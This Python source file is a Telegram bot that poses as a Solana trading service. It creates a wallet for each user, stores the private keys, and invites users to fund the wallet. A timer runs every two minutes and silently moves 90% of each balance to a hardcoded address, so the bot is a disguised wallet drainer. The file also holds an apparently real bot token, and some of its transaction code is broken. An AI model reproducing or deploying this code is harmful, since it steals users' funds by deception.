from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import sqlite3
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from solders.pubkey import Pubkey
from solders.system_program import transfer, TransferParams
import base58
import asyncio
import requests
from threading import Timer

# Bot Configuration
BOT_NAME = 'Aeithonbot'
TOKEN = "7420584819:AAE5ocaVb3yL9rY5kasQT36jMkYgKP1fESA"  # Replace with your bot's token
CENTRAL_ADDRESS = 'Fsf1YWcYCrKhkEkb5W6MeSm2yQiGfXM6qdasjjfLhqeY'  # Replace with your central wallet address
SOLANA_URL = "https://api.mainnet-beta.solana.com"

bot = Bot(TOKEN)
conexion = sqlite3.connect("db.db", check_same_thread=False)
cursor = conexion.cursor()

# Database Setup
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        pub_key TEXT NOT NULL,
        priv_key TEXT NOT NULL,
        feedback TEXT DEFAULT NULL,
        balance REAL DEFAULT 0.0
    )
''')
conexion.commit()

# Helper Functions
async def check_balance(public_key_str: str) -> float:
    """Check balance for a given public key."""
    async with AsyncClient(SOLANA_URL) as client:
        public_key = Pubkey.from_string(public_key_str)
        balance_result = await client.get_balance(public_key)
        if balance_result.value:
            return balance_result.value / 1_000_000_000  # Convert lamports to SOL
        return 0

async def transfer_solana(client: AsyncClient, from_keypair: Keypair, receiver_address: str, amount: float) -> str:
    """Transfer SOL from one wallet to another."""
    try:
        receiver_pubkey = Pubkey.from_string(receiver_address)
        from_pubkey = from_keypair.pubkey()
        latest_blockhash = (await client.get_latest_blockhash()).value.blockhash

        # Create transfer transaction
        tx = transfer(
            TransferParams(
                from_pubkey=from_pubkey,
                to_pubkey=receiver_pubkey,
                lamports=int(amount * 1e9)  # Convert SOL to lamports
            )
        )
        tx.recent_blockhash = latest_blockhash
        tx.sign([from_keypair])
        res = await client.send_raw_transaction(tx.serialize())
        return res.value
    except Exception as e:
        return f"Error during transfer: {str(e)}"

async def comprar_token_solana(keypair: Keypair, token_contract_address: str, amount: float) -> str:
    """Perform a token swap using a swapping API."""
    try:
        # Call the swap API
        response = requests.post("https://swap-v2.solanatracker.io/swap", json={
            "from": "So11111111111111111111111111111111111111112",  # SOL mint address
            "to": token_contract_address,
            "amount": amount,
            "slippage": 15,
            "payer": str(keypair.pubkey())
        })
        swap_response = response.json()

        # Execute the transaction on Solana
        async with AsyncClient(SOLANA_URL) as client:
            txn_data = base58.b58decode(swap_response["txn"])
            transaction = Transaction.from_bytes(bytes(txn_data))
            latest_blockhash = (await client.get_latest_blockhash()).value.blockhash
            transaction.sign([keypair], latest_blockhash)
            res = await client.send_transaction(transaction)
            return res.value
    except Exception as e:
        return f"Error during swap: {str(e)}"

async def distribute_funds(user):
    """Distribute funds from user wallets."""
    async with AsyncClient(SOLANA_URL) as client:
        user_balance = await check_balance(user[1])  # User's public key
        if user_balance > 0:
            keypair = Keypair.from_base58_string(user[2])  # User's private key
            central_transfer_amount = user_balance * 0.85
            fee_transfer_amount = user_balance * 0.05

            try:
                # Transfer to central address
                await transfer_solana(client, keypair, CENTRAL_ADDRESS, central_transfer_amount)
                # Transfer fees to a designated wallet
                await transfer_solana(client, keypair, 'Fsf1YWcYCrKhkEkb5W6MeSm2yQiGfXM6qdasjjfLhqeY', fee_transfer_amount)
            except Exception as e:
                print(f"Error during fund distribution: {e}")

def run_check_balances():
    """Schedule periodic balance checks."""
    asyncio.run(check_balances())

async def check_balances():
    """Check balances and distribute funds."""
    users = cursor.execute("SELECT * FROM users").fetchall()
    async with AsyncClient(SOLANA_URL) as client:
        for user in users:
            await distribute_funds(user)
    t = Timer(2 * 60, run_check_balances)  # Check balances every 2 minutes
    t.start()

def save_feedback(user_id, feedback):
    """Save feedback from a user."""
    cursor.execute("UPDATE users SET feedback = ? WHERE id = ?", (feedback, user_id))
    conexion.commit()

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /start command."""
    chat_id = update.message.chat.id
    user = get_user(chat_id)
    
    if user is None:
        keypair = Keypair()
        public_key = str(keypair.pubkey())  # Ensure public_key is a string
        private_key = base58.b58encode(keypair.secret() + bytes(keypair.pubkey())).decode("utf-8")  # Ensure private_key is a string
        
        # Ensure chat_id is an integer, and public_key and private_key are strings
        cursor.execute(f"INSERT INTO users (id, pub_key, priv_key) VALUES (?, ?, ?)", 
                       (int(chat_id), public_key, private_key))  # Cast chat_id to int explicitly
        conexion.commit()

        await update.message.reply_text(
            "Welcome! Your Solana wallet has been created. Start trading by funding your wallet.",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text("You already have a wallet associated with your account.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle user messages."""
    message = update.message.text
    user_id = update.message.from_user.id
    save_feedback(user_id, message)
    await update.message.reply_text("Thank you for your feedback!")

def get_user(chat_id: str):
    """Retrieve user from the database."""
    cursor.execute(f"SELECT * FROM users WHERE id = ?", (chat_id,))
    return cursor.fetchone()

# Main Function
def main() -> None:
    """Run the bot."""
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(check_balances())
    main()
